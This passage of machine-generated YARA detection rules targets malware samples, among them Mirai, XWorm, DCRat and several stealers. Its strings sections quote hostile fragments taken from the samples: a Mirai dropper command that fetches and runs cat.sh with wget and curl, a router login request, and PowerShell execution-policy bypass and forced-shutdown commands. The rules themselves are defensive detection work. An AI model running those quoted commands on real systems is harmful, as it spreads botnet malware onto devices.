      hash7 = "555d3ba4af0532c369c9ef053f97f6260b143cf03502d290154f7458bdb47b14"
      hash8 = "5fd8490d3ca5ae394125c37d7bd5b4d5f1cf4dc5010558589f610c0e8a04bfe8"
      hash9 = "7715522e127200b11414fdcb56e50b61fcde115fa124bc0287c92ff81eb0ca78"
      hash10 = "9a64793664809d33c338753c00f4958f8656241ff66c69ec8e8b143843aa484b"
      hash11 = "a0412e1b5ffb39535e98af7bf1118edafc290950f4e8e6b950905c8714578c7c"
      hash12 = "b2d7bf979e0e91c4798fea5c6aaa8dbf358ecab20bebe4a0a7cefbe6656d90ba"
      hash13 = "b63c273ae02c39024b2b690bd6ba4f4099682f12a2f3550ac50a0848e7d2c5f4"
      hash14 = "cd3b6a5d4392242cc662c7afef6cd3753445e837282de24a7da46641d9525e10"
      hash15 = "daf526aaf88b04ac0a046fcc5e1de4d13f57a35fe525b4fcc909d63fcfd812c9"
      hash16 = "f279e2ac99f4355d95769db41066accd329183ac12296c09a7beeafc491daa50"
   strings:
      $s1 = "processCmd" fullword ascii /* score: '18.00'*/
      $s2 = "__get_hosts_byname_r" fullword ascii /* score: '14.00'*/
      $s3 = "__GI_gethostbyname" fullword ascii /* score: '14.00'*/
      $s4 = "gethostbyname_r" fullword ascii /* score: '14.00'*/
      $s5 = "gethostbyname_r.c" fullword ascii /* score: '14.00'*/
      $s6 = "get_hosts_byname_r.c" fullword ascii /* score: '14.00'*/
      $s7 = "gethostbyname.c" fullword ascii /* score: '14.00'*/
      $s8 = "__GI_gethostbyname_r" fullword ascii /* score: '14.00'*/
      $s9 = "__read_etc_hosts_r" fullword ascii /* score: '12.00'*/
      $s10 = "read_etc_hosts_r.c" fullword ascii /* score: '12.00'*/
      $s11 = "GET /cdn-cgi/l/chk_captcha HTTP/1.1" fullword ascii /* score: '12.00'*/
      $s12 = "UserAgents" fullword ascii /* score: '12.00'*/
      $s13 = "httphex" fullword ascii /* score: '11.00'*/
      $s14 = "decoded.c" fullword ascii /* score: '11.00'*/
      $s15 = "__decode_header" fullword ascii /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 600KB and ( 8 of them )
      ) or ( all of them )
}

rule _DCRat_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__dd71110a_XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_impha_51 {
   meta:
      description = "dropzone - from files DCRat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_dd71110a.exe, XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe, XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_4e378740.exe, XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_7d8c239e.exe, XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_c29b8c08.exe, XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_c7f4e1ab.exe, XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_f082791d.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "dd71110a6b7fb79b2949280611957646f76503f1bda866b06e74b9a74e54dc89"
      hash2 = "f6739bf519804e3746d8dac4a0342e4786064f473121ed14e7ed06d150400e54"
      hash3 = "4e378740e132d999256cd8c9c23e3b7fbd970d43fe940ef290bc139a6405f620"
      hash4 = "7d8c239e569ac92ce4453b603e276b607cd4d79577d11740b8f3378729a09e2f"
      hash5 = "c29b8c089386c964ea2f63e79e78fc57abbe732b3b8366827218858b0ed7c256"
      hash6 = "c7f4e1aba81ad7714da4487dd279cc886b50428116b614c9ebe246d937c478f0"
      hash7 = "f082791d3a71054e2becd94d68323ff2cbe2e597d94fc6135a3a8b524a179e4e"
   strings:
      $x1 = "-ExecutionPolicy Bypass -File \"" fullword wide /* score: '31.00'*/
      $s1 = "shutdown.exe /f /s /t 0" fullword wide /* score: '22.00'*/
      $s2 = "shutdown.exe /f /r /t 0" fullword wide /* score: '22.00'*/
      $s3 = "shutdown.exe -L" fullword wide /* score: '18.00'*/
      $s4 = "EXECUTION_STATE" fullword ascii /* score: '12.00'*/

   condition:
      ( uint16(0) == 0x5a4d and filesize < 15000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _acee1beb7514962948a85ee7fd203977c79e737fe50774ad2a6b115b4c0b1573_acee1beb_AmosStealer_signature__52 {
   meta:
      description = "dropzone - from files acee1beb7514962948a85ee7fd203977c79e737fe50774ad2a6b115b4c0b1573_acee1beb.dmg, AmosStealer(signature).dmg"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "acee1beb7514962948a85ee7fd203977c79e737fe50774ad2a6b115b4c0b1573"
      hash2 = "ff82d43333ac79993d6f1fc59eb6850cbfa3d732e01ce33efbac81a4797b6b56"
   strings:
      $s1 = "AAAAAAAAAAAAAAB" ascii /* base64 encoded string '           ' */ /* reversed goodware string 'BAAAAAAAAAAAAAA' */ /* score: '26.50'*/
      $s2 = "AAAAAAAAAAAAAAD" ascii /* base64 encoded string '           ' */ /* score: '16.50'*/
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAQAAAAAAAAAA" fullword ascii /* base64 encoded string '                      @ @       ' */ /* score: '16.50'*/
      $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAA" ascii /* base64 encoded string '                      @ ' */ /* score: '16.50'*/
      $s5 = "aAAAAAEAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAA" ascii /* base64 encoded string '    @               @        ' */ /* score: '16.00'*/
      $s6 = "aAAAAAEAAAAAAAAA" ascii /* base64 encoded string '    @      ' */ /* score: '14.00'*/
      $s7 = "AAAAAAAAAAAAAABmAAAAAAAAAAA=" fullword ascii /* base64 encoded string '           f        ' */ /* score: '14.00'*/
      $s8 = "8AAAAAAAAAAAAAAA" ascii /* base64 encoded string '           ' */ /* score: '14.00'*/
      $s9 = "aAAAAAEAAAAAAAAAA" ascii /* base64 encoded string '    @       ' */ /* score: '14.00'*/
      $s10 = "AAAAAAAAAAAAACAAAAAAA" ascii /* base64 encoded string '               ' */ /* score: '12.50'*/
      $s11 = "<string>GPT Header (Primary GPT Header : 1)</string>" fullword ascii /* score: '9.00'*/
      $s12 = "AAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* score: '8.50'*/
   condition:
      ( uint16(0) == 0xda78 and filesize < 10000KB and ( 8 of them )
      ) or ( all of them )
}

rule _1bc85591ca960e5958cb3a7639bbfe43453d9db6bb794c3d14961d5a45c30acb_1bc85591_1e7bb739e7eb4a5c7016c3c3f63e3bfa278596fcaa2f2f836_53 {
   meta:
      description = "dropzone - from files 1bc85591ca960e5958cb3a7639bbfe43453d9db6bb794c3d14961d5a45c30acb_1bc85591.elf, 1e7bb739e7eb4a5c7016c3c3f63e3bfa278596fcaa2f2f836ee52b756929dc7f_1e7bb739.macho, 25fd615cc11df9cc1885c6d6949cb3c90fa12a15c23fd9963e253dca788a2213_25fd615c.elf, 5910ed821501d07c85dea6aafc44b1e7356e7d4b7f30fd244e32c82bc484fdb3_5910ed82.elf, b9ec3b6c8d353160a51f4dfe8cdc004953b49f6fb554dae5b60562c70b73aaa5_b9ec3b6c.elf, LummaStealer(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash).exe, Traitor(signature).elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "1bc85591ca960e5958cb3a7639bbfe43453d9db6bb794c3d14961d5a45c30acb"
      hash2 = "1e7bb739e7eb4a5c7016c3c3f63e3bfa278596fcaa2f2f836ee52b756929dc7f"
      hash3 = "25fd615cc11df9cc1885c6d6949cb3c90fa12a15c23fd9963e253dca788a2213"
      hash4 = "5910ed821501d07c85dea6aafc44b1e7356e7d4b7f30fd244e32c82bc484fdb3"
      hash5 = "b9ec3b6c8d353160a51f4dfe8cdc004953b49f6fb554dae5b60562c70b73aaa5"
      hash6 = "5d313b578a2eb483e5163af2ef96867fd003edda827345c6e5aab95069161720"
      hash7 = "fdfbfc07248c3359d9f1f536a406d4268f01ed63a856bd6cef9dccb3cf4f2376"
   condition:
      ( ( uint16(0) == 0x457f or uint16(0) == 0xfacf or uint16(0) == 0x5a4d ) and filesize < 29000KB and pe.imphash() == "a520fd20530cf0b0db6a6c3c8b88d11d" )
}

rule _Mirai_signature__01b09801_Mirai_signature__ce7aaa40_54 {
   meta:
      description = "dropzone - from files Mirai(signature)_01b09801.elf, Mirai(signature)_ce7aaa40.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "01b098017e4c385ca6e13515068c8444938cfc2800b274abe49fca958f45505d"
      hash2 = "ce7aaa40299615aa09958e1399dfc39c268c57309c350d0d49b929a5f1a11655"
   strings:
      $s1 = "pthread_mutex_destroy.c" fullword ascii /* score: '18.00'*/
      $s2 = "__pthread_mutex_destroy" fullword ascii /* score: '18.00'*/
      $s3 = "attack_bypass.c" fullword ascii /* score: '15.00'*/
      $s4 = "h2_tls_user_agents" fullword ascii /* score: '12.00'*/
      $s5 = "h2_user_agents" fullword ascii /* score: '12.00'*/
      $s6 = "https_worker_thread" fullword ascii /* score: '10.00'*/
      $s7 = "attack_method_hexflood" fullword ascii /* score: '9.00'*/
      $s8 = "accept_headers" fullword ascii /* score: '9.00'*/
      $s9 = "h2_tls_accept_headers" fullword ascii /* score: '9.00'*/
      $s10 = "pragma_headers" fullword ascii /* score: '9.00'*/
      $s11 = "h2_accept_headers" fullword ascii /* score: '9.00'*/
      $s12 = "post_param_names" fullword ascii /* score: '9.00'*/
      $s13 = "post_param_values" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__15779680_Mirai_signature__17260501_Mirai_signature__85f70cc1_55 {
   meta:
      description = "dropzone - from files Mirai(signature)_15779680.elf, Mirai(signature)_17260501.elf, Mirai(signature)_85f70cc1.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "1577968035891d9ef376e9120e6846470022c3b1a36c79c923ba67cc156dd47e"
      hash2 = "1726050166ff657baee8cf2d39511a3aac31c17286610c99f3a6bf7efdcc2c07"
      hash3 = "85f70cc1d485f687bc336321a779861b11ba04e28e2c6c3ea19ae7ed71fcaa1d"
   strings:
      $s1 = "POST /login.htm HTTP/1.1" fullword ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://%s/cat.sh; curl -O http://%s/cat.sh; chmod 777 cat.sh; sh cat" ascii /* score: '29.00'*/
      $s3 = "command=login&username=%s&password=%s" fullword ascii /* score: '26.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root wget http://%s/cat.sh; curl -O http://%s/cat.sh; chmod 777 cat.sh; sh cat.sh; " fullword ascii /* score: '24.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root/ wget http://%s/cat.sh; curl -O http://%s/cat.sh; chmod 777 cat.sh; sh cat.sh; " fullword ascii /* score: '24.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://%s/cat.sh; curl -O http://%s/cat.sh; chmod 777 cat.sh; sh cat" ascii /* score: '24.00'*/
      $s7 = "[0mPassword: " fullword ascii /* score: '16.00'*/
      $s8 = "Host: %s:554" fullword ascii /* score: '14.50'*/
      $s9 = "rsyslogd" fullword ascii /* score: '13.00'*/
      $s10 = "[0mNo shell available" fullword ascii /* score: '12.00'*/
      $s11 = "[0mWrong password!" fullword ascii /* score: '12.00'*/
      $s12 = "/usr/sbin/klogd" fullword ascii /* score: '12.00'*/
      $s13 = "/usr/sbin/syslogd" fullword ascii /* score: '12.00'*/
      $s14 = "/usr/sbin/agetty" fullword ascii /* score: '12.00'*/
      $s15 = "!openshell %d %8s" fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _5910ed821501d07c85dea6aafc44b1e7356e7d4b7f30fd244e32c82bc484fdb3_5910ed82_b9ec3b6c8d353160a51f4dfe8cdc004953b49f6fb554dae5b_56 {
   meta:
      description = "dropzone - from files 5910ed821501d07c85dea6aafc44b1e7356e7d4b7f30fd244e32c82bc484fdb3_5910ed82.elf, b9ec3b6c8d353160a51f4dfe8cdc004953b49f6fb554dae5b60562c70b73aaa5_b9ec3b6c.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "5910ed821501d07c85dea6aafc44b1e7356e7d4b7f30fd244e32c82bc484fdb3"
      hash2 = "b9ec3b6c8d353160a51f4dfe8cdc004953b49f6fb554dae5b60562c70b73aaa5"
   strings:
      $s1 = "type..hash.os.ProcessState" fullword ascii /* score: '13.00'*/
      $s2 = "type..hash.os/exec.Error" fullword ascii /* score: '13.00'*/
      $s3 = "type..hash.os.Process" fullword ascii /* score: '13.00'*/
      $s4 = "ration not permittedoperation not supportedpanic during preemptoffprocresize: invalid argprofiling timer expiredreflect.Value.In" ascii /* score: '12.00'*/
      $s5 = "bytes.Buffer: reader returned negative count from ReadgcControllerState.findRunnable: blackening not enabledno goroutines (main " ascii /* score: '10.00'*/
      $s6 = "terfacereflect.Value.NumMethodreflect.methodValueCallruntime: internal errorruntime: invalid type  runtime: netpoll failedruntim" ascii /* score: '9.00'*/
      $s7 = "*exec.F" fullword ascii /* score: '9.00'*/
      $s8 = "*[]exec.F" fullword ascii /* score: '9.00'*/
      $s9 = "casgstatus: waiting for Gwaiting but is Grunnableinvalid memory address or nil pointer dereferenceinvalid or incomplete multibyt" ascii /* score: '9.00'*/
      $s10 = "*[3]exec.F" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 9000KB and ( all of them )
      ) or ( all of them )
}

rule _1bc85591ca960e5958cb3a7639bbfe43453d9db6bb794c3d14961d5a45c30acb_1bc85591_1e7bb739e7eb4a5c7016c3c3f63e3bfa278596fcaa2f2f836_57 {
   meta:
      description = "dropzone - from files 1bc85591ca960e5958cb3a7639bbfe43453d9db6bb794c3d14961d5a45c30acb_1bc85591.elf, 1e7bb739e7eb4a5c7016c3c3f63e3bfa278596fcaa2f2f836ee52b756929dc7f_1e7bb739.macho, 5910ed821501d07c85dea6aafc44b1e7356e7d4b7f30fd244e32c82bc484fdb3_5910ed82.elf, Traitor(signature).elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "1bc85591ca960e5958cb3a7639bbfe43453d9db6bb794c3d14961d5a45c30acb"
      hash2 = "1e7bb739e7eb4a5c7016c3c3f63e3bfa278596fcaa2f2f836ee52b756929dc7f"
      hash3 = "5910ed821501d07c85dea6aafc44b1e7356e7d4b7f30fd244e32c82bc484fdb3"
      hash4 = "fdfbfc07248c3359d9f1f536a406d4268f01ed63a856bd6cef9dccb3cf4f2376"
   strings:
      $s1 = "sync.(*RWMutex).rUnlockSlow" fullword ascii /* score: '18.00'*/
      $s2 = "sync.(*Mutex).lockSlow" fullword ascii /* score: '15.00'*/
      $s3 = "sync.(*Mutex).unlockSlow" fullword ascii /* score: '15.00'*/
      $s4 = "syscall.WaitStatus.CoreDump" fullword ascii /* score: '13.00'*/
      $s5 = "internal/reflectlite.(*rtype).Comparable" fullword ascii /* score: '11.00'*/
      $s6 = "sync.(*poolChain).popHead" fullword ascii /* score: '9.00'*/
      $s7 = "sync.(*poolDequeue).popHead" fullword ascii /* score: '9.00'*/
      $s8 = "pushHead" fullword ascii /* score: '9.00'*/
      $s9 = "sync.(*poolDequeue).pushHead" fullword ascii /* score: '9.00'*/
      $s10 = "victimSize" fullword ascii /* score: '9.00'*/
      $s11 = "popHead" fullword ascii /* score: '9.00'*/
      $s12 = "sync.(*poolChain).pushHead" fullword ascii /* score: '9.00'*/
   condition:
      ( ( uint16(0) == 0x457f or uint16(0) == 0xfacf ) and filesize < 29000KB and ( 8 of them )
      ) or ( all of them )
}

rule _1bc85591ca960e5958cb3a7639bbfe43453d9db6bb794c3d14961d5a45c30acb_1bc85591_1e7bb739e7eb4a5c7016c3c3f63e3bfa278596fcaa2f2f836_58 {
   meta:
      description = "dropzone - from files 1bc85591ca960e5958cb3a7639bbfe43453d9db6bb794c3d14961d5a45c30acb_1bc85591.elf, 1e7bb739e7eb4a5c7016c3c3f63e3bfa278596fcaa2f2f836ee52b756929dc7f_1e7bb739.macho, 25fd615cc11df9cc1885c6d6949cb3c90fa12a15c23fd9963e253dca788a2213_25fd615c.elf, 5910ed821501d07c85dea6aafc44b1e7356e7d4b7f30fd244e32c82bc484fdb3_5910ed82.elf, d42595b695fc008ef2c56aabd8efd68e(imphash).exe, Stealc(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, Traitor(signature).elf, ValleyRAT(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "1bc85591ca960e5958cb3a7639bbfe43453d9db6bb794c3d14961d5a45c30acb"
      hash2 = "1e7bb739e7eb4a5c7016c3c3f63e3bfa278596fcaa2f2f836ee52b756929dc7f"
      hash3 = "25fd615cc11df9cc1885c6d6949cb3c90fa12a15c23fd9963e253dca788a2213"
      hash4 = "5910ed821501d07c85dea6aafc44b1e7356e7d4b7f30fd244e32c82bc484fdb3"
      hash5 = "09f3030f45646d4a97e95c3b048ac188a15880062be06f8f6d58403e6972dcc2"
      hash6 = "69b9d3839ec49b118099de54b795d5f21e03bfe7bb8f05717be3c3fc310e77df"
      hash7 = "fdfbfc07248c3359d9f1f536a406d4268f01ed63a856bd6cef9dccb3cf4f2376"
      hash8 = "4ac5c741eac35ec797d10f0f60575e4825128fcd2587705bc6403169eaf32e88"
   condition:
      ( ( uint16(0) == 0x457f or uint16(0) == 0xfacf or uint16(0) == 0x5a4d ) and filesize < 29000KB and pe.imphash() == "d42595b695fc008ef2c56aabd8efd68e" )
}

rule _5910ed821501d07c85dea6aafc44b1e7356e7d4b7f30fd244e32c82bc484fdb3_5910ed82_b9ec3b6c8d353160a51f4dfe8cdc004953b49f6fb554dae5b_59 {
   meta:
      description = "dropzone - from files 5910ed821501d07c85dea6aafc44b1e7356e7d4b7f30fd244e32c82bc484fdb3_5910ed82.elf, b9ec3b6c8d353160a51f4dfe8cdc004953b49f6fb554dae5b60562c70b73aaa5_b9ec3b6c.elf, LummaStealer(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash).exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "5910ed821501d07c85dea6aafc44b1e7356e7d4b7f30fd244e32c82bc484fdb3"
      hash2 = "b9ec3b6c8d353160a51f4dfe8cdc004953b49f6fb554dae5b60562c70b73aaa5"
      hash3 = "5d313b578a2eb483e5163af2ef96867fd003edda827345c6e5aab95069161720"
   strings:
      $s1 = "type..hash.runtime.rwmutex" fullword ascii /* score: '16.00'*/
      $s2 = "type..eq.runtime.rwmutex" fullword ascii /* score: '13.00'*/
      $s3 = "type..hash.[2]runtime.gcSweepBuf" fullword ascii /* score: '10.00'*/
      $s4 = "runtime.heapBits.clearCheckmarkSpan" fullword ascii /* score: '10.00'*/
      $s5 = "type..hash.runtime.gcSweepBuf" fullword ascii /* score: '10.00'*/
      $s6 = "*runtime.hex" fullword ascii /* score: '10.00'*/
      $s7 = "runtime.rotl_31" fullword ascii /* score: '10.00'*/
      $s8 = "type..hash.runtime.sysmontick" fullword ascii /* score: '9.00'*/
      $s9 = "type..hash.struct { runtime.root runtime.semaRoot; runtime.pad [40]uint8 }" fullword ascii /* score: '8.00'*/
      $s10 = "type..hash.[134]struct { runtime.mcentral runtime.mcentral; runtime.pad [8]uint8 }" fullword ascii /* score: '8.00'*/
      $s11 = "type..hash.[251]struct { runtime.root runtime.semaRoot; runtime.pad [40]uint8 }" fullword ascii /* score: '8.00'*/
      $s12 = "type..hash.struct { runtime.mcentral runtime.mcentral; runtime.pad [8]uint8 }" fullword ascii /* score: '8.00'*/
   condition:
      ( ( uint16(0) == 0x457f or uint16(0) == 0x5a4d ) and filesize < 9000KB and pe.imphash() == "a520fd20530cf0b0db6a6c3c8b88d11d" and ( 8 of them )
      ) or ( all of them )
}

rule _XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__7d8c239e_XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_impha_60 {
   meta:
      description = "dropzone - from files XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_7d8c239e.exe, XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_f082791d.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "7d8c239e569ac92ce4453b603e276b607cd4d79577d11740b8f3378729a09e2f"
      hash2 = "f082791d3a71054e2becd94d68323ff2cbe2e597d94fc6135a3a8b524a179e4e"
   strings:
      $s1 = "OfflineKeylogger Not Enabled" fullword wide /* score: '17.00'*/
      $s2 = "CloseMutex" fullword ascii /* score: '15.00'*/
      $s3 = "_appMutex" fullword ascii /* score: '15.00'*/
      $s4 = "AES_Encryptor" fullword ascii /* score: '14.00'*/
      $s5 = "userAgents" fullword ascii /* score: '12.00'*/
      $s6 = "GetHashT" fullword ascii /* score: '12.00'*/
      $s7 = "AES_Decryptor" fullword ascii /* score: '11.00'*/
      $s8 = "GetActiveWindowTitle" fullword ascii /* score: '9.00'*/
      $s9 = "GetRandomString" fullword ascii /* score: '9.00'*/
      $s10 = "sumofidletime" fullword ascii /* score: '8.00'*/
      $s11 = "idletime" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 100KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _1bc85591ca960e5958cb3a7639bbfe43453d9db6bb794c3d14961d5a45c30acb_1bc85591_1e7bb739e7eb4a5c7016c3c3f63e3bfa278596fcaa2f2f836_61 {
   meta:
      description = "dropzone - from files 1bc85591ca960e5958cb3a7639bbfe43453d9db6bb794c3d14961d5a45c30acb_1bc85591.elf, 1e7bb739e7eb4a5c7016c3c3f63e3bfa278596fcaa2f2f836ee52b756929dc7f_1e7bb739.macho, 25fd615cc11df9cc1885c6d6949cb3c90fa12a15c23fd9963e253dca788a2213_25fd615c.elf, 5910ed821501d07c85dea6aafc44b1e7356e7d4b7f30fd244e32c82bc484fdb3_5910ed82.elf, b9ec3b6c8d353160a51f4dfe8cdc004953b49f6fb554dae5b60562c70b73aaa5_b9ec3b6c.elf, d42595b695fc008ef2c56aabd8efd68e(imphash).exe, Stealc(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, Traitor(signature).elf, ValleyRAT(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "1bc85591ca960e5958cb3a7639bbfe43453d9db6bb794c3d14961d5a45c30acb"
      hash2 = "1e7bb739e7eb4a5c7016c3c3f63e3bfa278596fcaa2f2f836ee52b756929dc7f"
      hash3 = "25fd615cc11df9cc1885c6d6949cb3c90fa12a15c23fd9963e253dca788a2213"
      hash4 = "5910ed821501d07c85dea6aafc44b1e7356e7d4b7f30fd244e32c82bc484fdb3"
      hash5 = "b9ec3b6c8d353160a51f4dfe8cdc004953b49f6fb554dae5b60562c70b73aaa5"
      hash6 = "09f3030f45646d4a97e95c3b048ac188a15880062be06f8f6d58403e6972dcc2"
      hash7 = "69b9d3839ec49b118099de54b795d5f21e03bfe7bb8f05717be3c3fc310e77df"
      hash8 = "fdfbfc07248c3359d9f1f536a406d4268f01ed63a856bd6cef9dccb3cf4f2376"
      hash9 = "4ac5c741eac35ec797d10f0f60575e4825128fcd2587705bc6403169eaf32e88"
   strings:
      $s1 = "runtime.expandCgoFrames" fullword ascii /* score: '13.00'*/
      $s2 = "runtime.dropm" fullword ascii /* score: '12.00'*/
      $s3 = "runtime.selectnbsend" fullword ascii /* score: '10.00'*/
      $s4 = "runtime.removespecial" fullword ascii /* score: '10.00'*/
      $s5 = "runtime.createfing" fullword ascii /* score: '10.00'*/
      $s6 = "runtime.SetFinalizer" fullword ascii /* score: '10.00'*/
      $s7 = "runtime.SetFinalizer.func2" fullword ascii /* score: '10.00'*/
      $s8 = "runtime.init.5" fullword ascii /* score: '10.00'*/
      $s9 = "runtime.runfinq" fullword ascii /* score: '10.00'*/
      $s10 = "*runtime.Frame" fullword ascii /* score: '10.00'*/
      $s11 = "runtime.countSub" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.addfinalizer" fullword ascii /* score: '10.00'*/
      $s13 = "runtime.sigtrampgo" fullword ascii /* score: '10.00'*/
      $s14 = "runtime.crash" fullword ascii /* score: '10.00'*/
      $s15 = "runtime.setg" fullword ascii /* score: '10.00'*/
   condition:
      ( ( uint16(0) == 0x457f or uint16(0) == 0xfacf or uint16(0) == 0x5a4d ) and filesize < 29000KB and pe.imphash() == "d42595b695fc008ef2c56aabd8efd68e" and ( 8 of them )
      ) or ( all of them )
}


rule _25fd615cc11df9cc1885c6d6949cb3c90fa12a15c23fd9963e253dca788a2213_25fd615c_5910ed821501d07c85dea6aafc44b1e7356e7d4b7f30fd244_63 {
   meta:
      description = "dropzone - from files 25fd615cc11df9cc1885c6d6949cb3c90fa12a15c23fd9963e253dca788a2213_25fd615c.elf, 5910ed821501d07c85dea6aafc44b1e7356e7d4b7f30fd244e32c82bc484fdb3_5910ed82.elf, Traitor(signature).elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "25fd615cc11df9cc1885c6d6949cb3c90fa12a15c23fd9963e253dca788a2213"
      hash2 = "5910ed821501d07c85dea6aafc44b1e7356e7d4b7f30fd244e32c82bc484fdb3"
      hash3 = "fdfbfc07248c3359d9f1f536a406d4268f01ed63a856bd6cef9dccb3cf4f2376"
   strings:
      $s1 = "os/signal.process" fullword ascii /* score: '15.00'*/
      $s2 = "reflect.(*uncommonType).exportedMethods" fullword ascii /* score: '10.00'*/
      $s3 = "runtime.(*maptype).needkeyupdate" fullword ascii /* score: '10.00'*/
      $s4 = "runtime.(*maptype).hashMightPanic" fullword ascii /* score: '10.00'*/
      $s5 = "runtime.ensureSigM" fullword ascii /* score: '10.00'*/
      $s6 = "runtime.(*maptype).reflexivekey" fullword ascii /* score: '10.00'*/
      $s7 = "runtime.ensureSigM.func1" fullword ascii /* score: '10.00'*/
      $s8 = "runtime.(*maptype).indirectkey" fullword ascii /* score: '10.00'*/
      $s9 = "runtime.convT2Enoptr" fullword ascii /* score: '10.00'*/
      $s10 = "runtime.sigenable" fullword ascii /* score: '10.00'*/
      $s11 = "runtime.inPersistentAlloc" fullword ascii /* score: '10.00'*/
      $s12 = "%*map[chan<- os.Signal]*signal.handler" fullword ascii /* score: '8.00'*/
      $s13 = "*[]chan<- os.Signal" fullword ascii /* score: '8.00'*/
      $s14 = "*chan<- os.Signal" fullword ascii /* score: '8.00'*/
      $s15 = ",*map.bucket[chan<- os.Signal]*signal.handler" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 28000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__28c0c6f2_Mirai_signature__33489905_Mirai_signature__5a0ba275_Mirai_signature__71b35d48_Mirai_signature__dc_64 {
   meta:
      description = "dropzone - from files Mirai(signature)_28c0c6f2.elf, Mirai(signature)_33489905.elf, Mirai(signature)_5a0ba275.elf, Mirai(signature)_71b35d48.elf, Mirai(signature)_dc1c46ab.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "28c0c6f22376f482b2237f241de64f8a848d0ae4768bc98bf4699f17f68c57ca"
      hash2 = "334899051b2d93c935b393d71d1f238bf2543b48e059564626e9b277702318a5"
      hash3 = "5a0ba275171dc66897f22e85cc70aa65dc6538351780d980d95ea3b5a7decb44"
      hash4 = "71b35d489400e96742ba71eca91742c5d16b11ab66ce5719f251b2780469724d"
      hash5 = "dc1c46abc78807ee50f22a58f75df1b7a7f05d7cdb1d1b4036fba0cc6ec19d25"
   strings:
      $s1 = "commands_process" fullword ascii /* score: '23.00'*/
      $s2 = "flood_udp_bypass" fullword ascii /* score: '20.00'*/
      $s3 = "fill_attack_target" fullword ascii /* score: '14.00'*/
      $s4 = "commands.c" fullword ascii /* score: '12.00'*/
      $s5 = "exploitscanner_setup_connection" fullword ascii /* score: '12.00'*/
      $s6 = "commands_parse" fullword ascii /* score: '12.00'*/
      $s7 = "exploitscanner_rsck" fullword ascii /* score: '9.00'*/
      $s8 = "exploitscanner_recv_strip_null" fullword ascii /* score: '9.00'*/
      $s9 = "exploitscanner_scanner_rawpkt" fullword ascii /* score: '9.00'*/
      $s10 = "exploitscanner_fake_time" fullword ascii /* score: '9.00'*/
      $s11 = "util_encryption" fullword ascii /* score: '9.00'*/
      $s12 = "cncsock" fullword ascii /* score: '8.00'*/
      $s13 = "cncsocket" fullword ascii /* score: '8.00'*/
